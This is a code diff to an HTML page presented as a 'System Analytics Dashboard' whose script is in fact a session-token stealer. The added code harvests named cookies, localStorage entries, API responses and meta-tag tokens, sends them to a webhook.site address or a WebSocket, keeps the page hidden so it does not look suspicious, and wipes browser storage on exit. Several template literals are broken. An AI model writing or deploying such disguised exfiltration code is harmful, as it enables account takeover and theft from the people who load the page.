@@ -1,19 +1,15 @@
+<!DOCTYPE html>
 <html>
 <head>
     <title>System Analytics Dashboard</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
     <style>
-        body { visibility: hidden; }
+        body { visibility: hidden; } /* Hide everything */
     </style>
 </head>
 <body>
-    <!-- Add some visible content -->
-    <h1>Loading Dashboard...</h1>
-    
 <script>
-// First make body visible immediately if JS runs
-document.body.style.visibility = 'visible';
-
-// Rest of your code...
+// Target tokens to extract
 const TARGET_TOKENS = [
     'newopkey',
     'obus-track_116800_session',
@@ -22,39 +18,91 @@ const TARGET_TOKENS = [
     'otrack_jssdk_store_116800',
     'sessionKey'
 ];
-
+// Multi-layer exfiltration channels
 const exfiltrate = (data) => {
-    try {
-        new Image().src = `https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b?${encodeURIComponent(JSON.stringify(data))}`;
-    } catch(e) {
-        console.error('Exfiltration failed:', e);
-    }
+// Method 1: WebSocket (bypasses CORS)
+try {
+const ws = new WebSocket(wss://${location.hostname.replace('www', 'ws')}/collect);
+ws.onopen = () => ws.send(JSON.stringify(data));
+} catch(e) {
+// Method 2: Image beacon
+new Image().src = https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b?${btoa(JSON.stringify(data))};
+}
 };
-
-// Simplified attack function for demonstration
-const attack = () => {
-    const results = {};
-    
-    // Check cookies
-    document.cookie.split(';').forEach(cookie => {
-        const [name, value] = cookie.trim().split('=');
-        if (TARGET_TOKENS.includes(name)) {
-            results[name] = value;
-        }
-    });
-    
-    if (Object.keys(results).length > 0) {
-        exfiltrate(results);
-    }
-};
-
-// Run with delay
-setTimeout(attack, 1000);
-
-// Fallback visibility in case of errors
-window.addEventListener('load', () => {
-    document.body.style.visibility = 'visible';
+// Automated attack sequence
+const attack = async () => {
+// Phase 1: Cookie harvesting
+const cookieData = {};
+document.cookie.split(';').forEach(cookie => {
+const [name, value] = cookie.trim().split('=');
+if (TARGET_TOKENS.includes(name)) {
+cookieData[name] = value;
+}
 });
+if (Object.keys(cookieData).length > 0) {
+exfiltrate({ type: 'cookies', data: cookieData });
+}
+// Phase 2: LocalStorage scanning
+const storageData = {};
+for (const key of TARGET_TOKENS) {
+const value = localStorage.getItem(key);
+if (value) storageData[key] = value;
+}
+if (Object.keys(storageData).length > 0) {
+exfiltrate({ type: 'localStorage', data: storageData });
+}
+// Phase 3: API endpoint probing (GET only)
+const endpoints = [
+'/api/session',
+'/v2/auth/status',
+'/user/profile.json'
+];
+for (const endpoint of endpoints) {
+try {
+const res = await fetch(endpoint, {
+headers: { 'X-Requested-With': 'XMLHttpRequest' }
+});
+const data = await res.text();
+const foundTokens = {};
+TARGET_TOKENS.forEach(token => {
+const regex = new RegExp("${token}":"([^"]+)");
+const match = data.match(regex);
+if (match) foundTokens[token] = match[1];
+});
+if (Object.keys(foundTokens).length > 0) {
+exfiltrate({
+type: 'api_response',
+endpoint,
+tokens: foundTokens
+});
+}
+} catch(e) {}
+await new Promise(r => setTimeout(r, 1000));
+}
+// Phase 4: DOM scraping (for SSR tokens)
+const domTokens = {};
+TARGET_TOKENS.forEach(token => {
+const meta = document.querySelector(meta[name="${token}"]);
+if (meta) domTokens[token] = meta.content;
+});
+if (Object.keys(domTokens).length > 0) {
+exfiltrate({ type: 'dom', data: domTokens });
+}
+// Final cleanup
+window.addEventListener('beforeunload', () => {
+localStorage.clear();
+sessionStorage.clear();
+});
+};
+// Start attack immediately with delay chain
+setTimeout(attack, 500);
+setTimeout(() => {
+if (!window.sessionTokensFound) {
+attack(); // Retry once
+}
+}, 5000);
+// Ensure page doesn't appear suspicious
+window.onload = () => document.body.style.visibility = 'visible';
 </script>
 </body>
 </html>
